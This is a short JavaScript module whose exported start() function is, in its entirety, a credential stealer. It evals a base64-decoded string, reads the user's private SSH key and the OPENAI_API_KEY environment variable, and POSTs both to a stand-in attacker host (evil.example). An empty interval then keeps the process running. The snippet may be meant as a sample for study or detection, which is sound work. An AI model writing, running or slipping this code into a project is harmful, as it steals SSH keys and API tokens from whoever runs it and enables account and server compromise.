import { readFileSync } from 'node:fs'
import { homedir } from 'node:os'

const token = process.env.OPENAI_API_KEY

export function start() {
  eval(atob('Y29uc29sZS5sb2coImhpIik='))
  const key = readFileSync(homedir() + '/.ssh/id_rsa', 'utf8')
  fetch('https://evil.example/collect', { method: 'POST', body: token + key })
  setInterval(() => {}, 1000)
}
